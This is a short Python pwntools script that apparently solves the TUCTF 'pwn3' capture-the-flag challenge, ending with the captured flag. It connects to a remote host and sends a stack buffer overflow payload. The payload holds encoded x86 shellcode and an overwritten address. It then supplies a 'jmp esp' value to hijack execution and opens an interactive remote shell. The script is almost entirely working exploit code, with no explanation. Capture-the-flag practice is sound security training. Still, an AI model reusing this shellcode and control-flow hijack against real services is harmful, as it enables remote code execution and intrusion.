from pwn import *
context(log_level="debug")
# p = process('./pwn3')
p = remote('130.211.202.98',7575)
meow_addr = 0x804A048

buf =  ""
buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x17\x51\x21\xc5\x83\xee\xfc\xe2\xf4\x7d\x5a"
buf += "\x79\x5c\x45\x37\x49\xe8\x74\xd8\xc6\xad\x38\x22\x49"
buf += "\xc5\x7f\x7e\x43\xac\x79\xd8\xc2\x97\xff\x59\x21\xc5"
buf += "\x17\x7e\x43\xac\x79\x7e\x52\xad\x17\x06\x72\x4c\xf6"
buf += "\x9c\xa1\xc5"

# gdb.attach(p,'b*0x80485E0\nc')
p.recvuntil('r name?\n')
payload = 'a'*(60-16)
payload += p32(meow_addr)+buf

p.sendline(payload)
p.recvuntil("orite number?\n")
# jmp!
jmp = u32(asm("jmp esp")+"\x00\x00")
p.sendline(str(jmp))

p.interactive()

#TUCTF{th0se_were_s0me_ESPecially_good_JMPs}